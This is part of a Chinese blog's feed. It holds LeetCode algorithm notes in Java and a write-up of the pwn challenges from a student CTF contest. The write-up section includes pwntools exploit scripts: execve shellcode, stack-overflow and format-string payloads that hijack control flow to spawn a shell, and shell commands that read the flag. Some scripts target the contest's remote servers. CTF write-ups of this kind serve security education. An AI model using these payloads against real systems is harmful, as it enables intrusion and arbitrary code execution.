如果左子树和右子树的深度相等，说明是完全二叉树</span></span><br><span class="line">        <span class="keyword">if</span> (leftDepth == rightDepth) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; leftDepth) + getNumber(node.right); <span class="comment">// 2^leftDepth + 右子树的节点数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; rightDepth) + getNumber(node.left); <span class="comment">// 2^rightDepth + 左子树的节点数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算树的深度</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getDepth</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">            depth++;</span><br><span class="line">            node = node.left; <span class="comment">// 只计算左子树的深度</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;二叉树的最大深度&quot;&gt;&lt;a href=&quot;#二叉树的最大深度&quot; class=&quot;headerlink&quot; title=&quot;二叉树的最大深度&quot;&gt;&lt;/a&gt;二叉树的最大深度&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/max</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>2024CUDSEC新生赛</title>
    <link href="https://yubut.github.io/2024/11/09/2024CUDSEC%E6%96%B0%E7%94%9F%E8%B5%9B/"/>
    <id>https://yubut.github.io/2024/11/09/2024CUDSEC%E6%96%B0%E7%94%9F%E8%B5%9B/</id>
    <published>2024-11-09T04:48:37.000Z</published>
    <updated>2024-11-09T08:12:28.340Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CUDSEC——第七届”玄武杯”Pwn方向WP"><a href="#CUDSEC——第七届”玄武杯”Pwn方向WP" class="headerlink" title="CUDSEC——第七届”玄武杯”Pwn方向WP"></a>CUDSEC——第七届”玄武杯”Pwn方向WP</h4><h3 id="sign"><a href="#sign" class="headerlink" title="sign"></a>sign</h3><p>签到题没什么好说的 flag写在程序里 拖进IDA秒.</p><h3 id="easy-shell"><a href="#easy-shell" class="headerlink" title="easy_shell"></a>easy_shell</h3><p>算加强版签到了 运行程序看到<br><img src="/../imgs/2024-10/image-20241109125426328.png" alt="image-20241109125426328"></p><p>提示给了shell 那是提供了后门的（进IDA分析也能看到）<br>直接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p><img src="/../imgs/2024-10/image-20241109125715321.png" alt="image-20241109125715321"></p><p>打远程加上flag查看就好了.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag 1&gt;&amp;0</span><br></pre></td></tr></table></figure><p>如果说为什么出这个感觉不沾边 问就是之前给新同学们布置过相关学习任务 考察一下（欢迎非预期的佬们交流~</p><h3 id="only-chance"><a href="#only-chance" class="headerlink" title="only_chance"></a>only_chance</h3><p>这题有学弟卡在第二次地址接收 其实主要还是栈的工作原理理解的不是特别透彻（反思ing</p><p>运行其实就有提示没有后门怎么搞 八成要自己构造shellcode多打几次<br>IDA分析发现gets s的大小是280 这里就可以利用栈溢出重定向到main进行第二次程序运行执行shellcode<br>使用NOP sled确保在返回到 shellcode 时，即使位置偏移，程序也会“滑行”到有效的指令区域（2048也111）</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;arm64&#x27;</span>, os = <span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./oneChance&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>] + <span class="number">1</span></span><br><span class="line">offset = <span class="number">280</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] main_addr:&#x27;</span>, <span class="built_in">hex</span>(main))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] offest:&#x27;</span>, <span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload1， ret到main头，获取第二次输入机会</span></span><br><span class="line">payload1 = offset * <span class="string">b&#x27;a&#x27;</span> + p64(main)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oneChance&#x27;</span>)</span><br><span class="line"><span class="comment"># = remote(&#x27;127.0.0.1&#x27;,8888)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;where are them\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取栈顶地址</span></span><br><span class="line">stack = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) + <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;[+] stack:&#x27;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x50</span>   <span class="comment"># 先填充nop链</span></span><br><span class="line">payload2 += shellcode       <span class="comment"># 执行shellcode</span></span><br><span class="line">payload2 += <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="built_in">len</span>(shellcode) - <span class="number">0x50</span>)     <span class="comment"># 填充完剩余栈区</span></span><br><span class="line">payload2 += p64(stack)      <span class="comment"># ret: 回到栈顶，开始执行</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>也有师傅是shellcode接受栈地址 然后控制程序流执行到shellcode 就可以拿到shell了 比我这个精简多了.下附R师傅的思路.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#p=process(&#x27;./one_chance&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">49494</span>)</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./one_chance&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401463</span></span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x110</span>+p64(<span class="number">0x404500</span>)+p64(ret)+p64(<span class="number">0x401360</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I&#x27;ll tell where are them\n&quot;</span>,payload)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(stack))</span><br><span class="line">shell=shellcraft.sh()</span><br><span class="line">shell=asm(shell)</span><br><span class="line">payload=shell.ljust(<span class="number">0x118</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(stack)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;I&#x27;ll tell where are them\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>如果你是2048高手 那这题真的就是送了 但是感觉有点遗憾 没有很多师傅的反馈呜呜（也可能是有些师傅觉得太easy不屑一顾hh 🤩<br>其实主要是一个非预期填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">xt.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./p2048&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="number">22770</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;z&#x27;</span> * (<span class="number">1024</span> + <span class="number">28</span>)  + <span class="string">b&#x27;\n&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;w&#x27;</span><span class="comment">#非预期填充</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互模式</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>Hint是栈和格式化字符串 需要debug<br>貌似这题存在些疑问 希望有问题的师傅可以下来一起交流（lose 我是菜菜fw</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.cn&#x27;,40454)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hey, what&#x27;s your name? : &quot;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%10$p&quot;</span>+<span class="string">b&quot;A&quot;</span>*<span class="number">3</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">shellcode_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;to exit? (y/n)&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;hello \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">24</span>+p64(shellcode_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;CUDSEC——第七届”玄武杯”Pwn方向WP&quot;&gt;&lt;a href=&quot;#CUDSEC——第七届”玄武杯”Pwn方向WP&quot; class=&quot;headerlink&quot; title=&quot;CUDSEC——第七届”玄武杯”Pwn方向WP&quot;&gt;&lt;/a&gt;CUDSEC——第七届”玄武杯”P</summary>
      
    
    
    
    <category term="二进制安全" scheme="https://yubut.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="pwn" scheme="https://yubut.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x1</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x1/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x1/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-26T05:45:26.431Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h4><p>link：<a href="https://leetcode.cn/problems/binary-search/description/">704. 二分查找 - 力扣（LeetCode）</a><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240923152617533.png" alt="image-20240923152617533"></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目给出数组升序 ，想到二分查找（好吧其实题目也给出来了w）<br>找到mid，根据逻辑大小缩小范围比较.</p><h6 id="全包围-lefg-right"><a href="#全包围-lefg-right" class="headerlink" title="全包围[lefg,right]"></a>全包围[lefg,right]</h6><p>假如数组大小为6，取值范围就是[0,5].闭区间使得定义left &#x3D; 0，right &#x3D; nums.length-1（防止越界指针无效，也是根据此处可以反推没有左开右闭情况）<br>left指针是0.right是5，这个时候left &#x3D;&#x3D; right是有效的，结束条件也就是left&lt;&#x3D;right，再根据mid位置进行判断，target是再mid左边还是右边或者是幸运的查找到目标位置.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//看到数组习惯性反应越界问题</span></span><br><span class="line">        <span class="comment">//闭区间</span></span><br><span class="line">       </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid -<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="左闭右开-left-rigjht"><a href="#左闭右开-left-rigjht" class="headerlink" title="左闭右开[left,rigjht)"></a>左闭右开[left,rigjht)</h6><p>同样的条件但是right指针指向nums.length，对应的left &#x3D;&#x3D; right没有意义.所以判断条件是left &lt; right.如果target在nums[mid]左边的话，把left赋值为mid+1，但是反过来<strong>target在nums[mid]右边的话，就要赋值left为mid</strong>【右边开mid指的指针不参加下一次循环判读】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123; </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="全开-left-right"><a href="#全开-left-right" class="headerlink" title="全开(left,right)"></a>全开(left,right)</h6><p>分析同上述 只不过全开两种情况都赋值为mid.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123; </span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left + <span class="number">1</span> &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target) &#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h5><p><strong>1.区间问题，判断条件是否能遍历所有下标.</strong><br><strong>2.其实将mid取值方法改成left+((right-left)&gt;&gt;1)【和 &#x2F; 2一样】是最好的，直接用（left+right）&#x2F; 2和（left+right）&#x2F;&#x2F; 2 【向下取整】 只适用于少数据全包围情况，此情况left和right都是int范围，取值范围是-2147483648-2147483647，当两个数值很接近边界值的时候相加很容易出现负值</strong><br><strong>3.（right-left ）&#x2F; 2 只是表示了left和right指针之间距离的一半，不能表示mid所在的位置，用left加上距离的一半刚好能进行表示.</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;二分查找&quot;&gt;&lt;a href=&quot;#二分查找&quot; class=&quot;headerlink&quot; title=&quot;二分查找&quot;&gt;&lt;/a&gt;二分查找&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/binary-search/descr</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x10</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x10/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x10/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T07:24:15.675Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二叉树的层序遍历（广度优先遍历）"><a href="#二叉树的层序遍历（广度优先遍历）" class="headerlink" title="二叉树的层序遍历（广度优先遍历）"></a>二叉树的层序遍历（广度优先遍历）</h4><p>link：<a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/description/">102. 二叉树的层序遍历 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目说明从左往右进行遍历，其实可以堪称给二叉树每一层都画横线分割开来，left first，right last.</p><p><img src="/../imgs/2024-10/image-20241108151829868.png" alt="image-20241108151829868"></p><p>n代表null 输出只从存在的节点中输出.<br>最先想到的就是递归，按照创建树的思路，pass掉空节点就好.<br>先前做过队列模拟栈，其实这里用队列来解决也很优雅.</p><h6 id="队列BFS"><a href="#队列BFS" class="headerlink" title="队列BFS"></a>队列BFS</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">//获取当前队列的大小</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">while</span>(size != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                tmp.add(cur.val);</span><br><span class="line">                size--;</span><br><span class="line">                <span class="keyword">if</span>(cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(cur.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cur.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.offer(cur.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret.add(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>高度:二叉树中任意一个节点到叶子结点的距离<br>深度:二叉树中任意一个节点到<a href="https://so.csdn.net/so/search?q=%E6%A0%B9%E8%8A%82%E7%82%B9&spm=1001.2101.3001.7020">根节点</a>的距离</p><p><strong><code>List&lt;List&lt;Integer&gt;&gt;</code> 的必要性</strong></p><p>每一层的节点值需要单独存储在一个列表中，然后将所有层的列表整合在一个大列表中。因此，最终结果需要一个嵌套的列表结构。</p><h4 id="反转二叉树"><a href="#反转二叉树" class="headerlink" title="反转二叉树"></a>反转二叉树</h4><p>link：<a href="https://leetcode.cn/problems/invert-binary-tree/description/">226. 翻转二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>根据题意，看到的是左右子树内部交换自身孩子节点，然后左右子树又进行了交换.<br>递归交换就秒了.<br>其实可以老老实实的逐个左右交换，也可以按照上一题层序遍历的一层层交换（观察到最后一层是1，3，6，9——&gt;9，6，3，1）</p><h6 